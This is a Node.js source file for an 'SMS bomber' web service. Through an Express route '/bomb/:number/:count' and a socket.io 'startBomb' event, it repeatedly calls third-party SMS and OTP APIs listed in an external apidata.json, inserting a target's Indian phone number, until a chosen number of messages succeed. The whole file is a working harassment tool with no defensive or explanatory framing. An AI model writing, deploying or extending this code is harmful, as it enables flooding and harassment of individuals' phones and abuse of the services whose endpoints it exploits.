#!/usr/bin/env node

const express = require('express')
const socketIO = require('socket.io'); 
const fs = require('fs');
const axios = require('axios');
const http = require('http');

const app = express()
let server = http.createServer(app)
const port = process.env.PORT||3000
let io = socketIO(server) 
server.listen(port,()=>{
   console.log('Visit localhost:'+port);
});


app.use(express.static(__dirname + "/public"));
app.get('/bomb/:number/:count', function (req, res) {
    res.setHeader('Content-Type', 'application/json');
    var number =  req.params.number;
    var count = req.params.count || 1;
    sendSms(number,count,res);
})






io.on('connection', (socket)=>{
    console.log('New user connected');
    socket.on('startBomb', (data)=>{ 
        sendSms(data.number,data.count,socket) 
    }); 
});







function sendSms(number,count=1,socket){
    var success=0,failed=0;
fs.readFile('apidata.json',async (err,data) =>{
    if(err) throw err;

    while(success<count){
        var nom = Math.floor((Math.random() * 24) + 1);
        var jj = JSON.stringify(JSON.parse(data).sms[91][nom]);
        if(jj){
            var json = jj.replace(/{target}/g,number).replace(/{cc}/g,"91");
        json = JSON.parse(json);
    
        var newdata = {
            url:json.url,
            method:json.method,
            data:json.data,
            params:json.params,
            json:json.json,
            headers:json.headers,
            timeout:6000
        }
        var identifier = json.identifier;
        try {
           var request = await axios(newdata);
           var resp = JSON.stringify(request.data)
           verified = resp.includes(identifier)
           if(verified){
                success++
                var jsonf = {
                  "success":success
                }
                socket.emit('bombing',jsonf);
                console.log(json.name)
            } else{
            failed++;
            } 
        } catch(err){
        }
        
        }
   }
})
}
